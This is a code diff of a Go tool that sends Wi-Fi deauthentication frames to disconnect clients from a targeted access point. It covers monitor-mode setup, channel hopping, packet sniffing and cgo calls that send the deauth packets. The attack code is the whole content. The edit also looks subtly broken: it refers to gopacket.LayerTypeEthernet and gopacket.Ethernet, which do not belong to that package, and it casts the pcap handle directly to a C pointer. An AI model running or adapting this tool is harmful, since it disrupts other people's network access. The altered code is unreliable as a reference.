@@ -13,7 +13,6 @@ import (
 	"time"
 
 	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
@@ -26,7 +25,6 @@ type Args struct {
 var args Args
 var handle *pcap.Handle
 
-// setupMonitorMode sets the network interface into monitor mode.
 func setupMonitorMode(interfaceName string) {
 	if err := exec.Command("ifconfig", interfaceName, "down").Run(); err != nil {
 		log.Printf("Failed to bring interface down: %v", err)
@@ -43,14 +41,12 @@ func setupMonitorMode(interfaceName string) {
 	fmt.Printf("Monitor mode enabled on %s\n", interfaceName)
 }
 
-// restoreMode restores the network interface to managed mode.
 func restoreMode(interfaceName string) {
 	if err := exec.Command("iwconfig", interfaceName, "mode", "managed").Run(); err != nil {
 		log.Printf("Failed to restore mode: %v", err)
 	}
 }
 
-// channelHop continuously hops between channels.
 func channelHop(interfaceName string) {
 	for {
 		for ch := 1; ch <= 13; ch++ {
@@ -64,29 +60,40 @@ func channelHop(interfaceName string) {
 	}
 }
 
-// capturePackets processes incoming packets and sends deauth packets.
 func capturePackets() {
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
-		ethLayer := packet.Layer(layers.LayerTypeEthernet)
+		ethLayer := packet.Layer(gopacket.LayerTypeEthernet)
 		if ethLayer == nil {
 			continue
 		}
 
-		ethernet := ethLayer.(*layers.Ethernet)
+		ethernet := ethLayer.(*gopacket.Ethernet)
+
 		if ethernet.SrcMAC.String() == args.targetAP.String() {
 			if args.targetClient != nil {
 				if ethernet.DstMAC.String() == args.targetClient.String() {
-					C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), (*C.u_char)(&args.targetClient[0]), C.DEAUTH, C.uint16_t(1))
+					C.send_control_packet(
+						(*C.pcap_t)(handle),
+						(*C.uint8_t)(&args.targetAP[0]),
+						(*C.uint8_t)(&args.targetClient[0]),
+						C.DEAUTH,
+						C.uint16_t(1),
+					)
 				}
 			} else {
-				C.send_control_packet(handle, (*C.u_char)(&args.targetAP[0]), nil, C.DEAUTH, C.uint16_t(1))
+				C.send_control_packet(
+					(*C.pcap_t)(handle),
+					(*C.uint8_t)(&args.targetAP[0]),
+					nil,
+					C.DEAUTH,
+					C.uint16_t(1),
+				)
 			}
 		}
 	}
 }
 
-// scanNetworks uses the 'iw' command to scan available networks.
 func scanNetworks() error {
 	cmd := exec.Command("iw", "dev", args.interfaceName, "scan")
 	output, err := cmd.Output()
